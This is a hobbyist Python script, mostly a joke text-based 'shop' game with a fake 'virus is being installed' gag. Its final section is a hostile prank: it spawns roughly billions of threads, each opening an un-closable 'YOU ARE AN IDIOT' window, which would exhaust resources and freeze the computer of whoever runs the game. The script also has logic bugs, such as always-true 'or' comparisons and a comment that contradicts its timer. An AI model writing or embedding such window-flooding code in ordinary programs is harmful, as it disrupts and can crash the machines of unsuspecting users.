
import tkinter as tk
from tkinter import messagebox
import pygame
import sys
import os
import subprocess
import random

input('Virus is being installed press enter to continue...')
input('Installed! Taking over your computer now...')
input('Just kidding!')


def main():
    while True:
        input("Hello And welcome to THE SHOP(By Amad Ismail Muhammad Jalal Mahmud Ahmad)(Press enter to continue for every single line((If it's not a question.))")
        input('So')
        input('We have:\nchatgpt (out of stock)\nside business tutor\nmy life ')

        thing_they_ordered = input("What would you like? (Don't answer this in caps (And don't order 2 things!)) (if you don't answer you'll get sent to the start! ").strip() .lower()

        if thing_they_ordered == 'side business tutor':
            doolar = input("That would be 10$ (if you give me the money type *gives 10$*) AND IF YOU DON'T I AM SENDING YOU TO THE START ").strip() .lower()
            if doolar == '*gives 10$*':
                print('Starting...')
                input("Let's get going!'")
                input("Side businesses are an important thing in life")
                input('To start, Learn any coding language -- But before that you should Think about how to publish apps and such in your coding')
                input('Then (if you have a mac) go to Xcode and publish your work but it will be 100$ to publish it')
                input("But if you have Windows, find a way to publish your work")
                input('Then wait!!!')
                break  # End it
        elif thing_they_ordered == 'my life':
            doolr = input("That would be 1$ (if you give me the money type *gives 1$*) AND IF YOU DON'T I AM SENDING YOU TO THE START ").strip() .lower()
            if doolr == '*gives 1$*': print("This one was a scam (but the others weren't)")
            input("you won't choose another one because i don't want you to so let's skip to the next part! ")
            break
        elif thing_they_ordered == 'chatgpt':
            print('Bro pick it again')

if __name__ == "__main__":
    main()

input('So.')
fun = input('Has this been fun?').strip() .lower()
if fun == 'yes':
 print('AYYYYYY you said {}'.format(fun))
elif fun == 'yahs' or 'yas' or 'yup' or 'of course':
 print('AYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYY')
elif fun == 'nah' or 'nope' or 'of course not' or 'nap':
 print('ALL MY HARD WORK FOR NOTHING')
else:
    print('???')
    input('Anyways this is  the end for now (Press enter)')
    input('Now, Let me show some stuff i made:)')

    import tkinter as tk
    from tkinter import messagebox
    import pygame


input('Press enter(Then go to the other files')
import tkinter as tk
import random
import threading

def show_idiot_window():
    def on_close():
        show_idiot_window()

    window = tk.Tk()
    window.title("Warning")
    label = tk.Label(window, text="YOU ARE AN IDIOT", font=("Helvetica", 24))
    label.pack(padx=20, pady=20)
    window.protocol("WM_DELETE_WINDOW", on_close)  # Reopen window on close
    window.after(999999999999999999, window.destroy)  # Automatically close after 3 seconds
    window.mainloop()

def open_multiple_windows():
    num_windows = random.randint(999999999, 9999999999)
    threads = []
    for _ in range(num_windows):
        thread = threading.Thread(target=show_idiot_window)
        thread.start()
        threads.append(thread)
    for thread in threads:
        thread.join()

if __name__ == "__main__":
    open_multiple_windows()
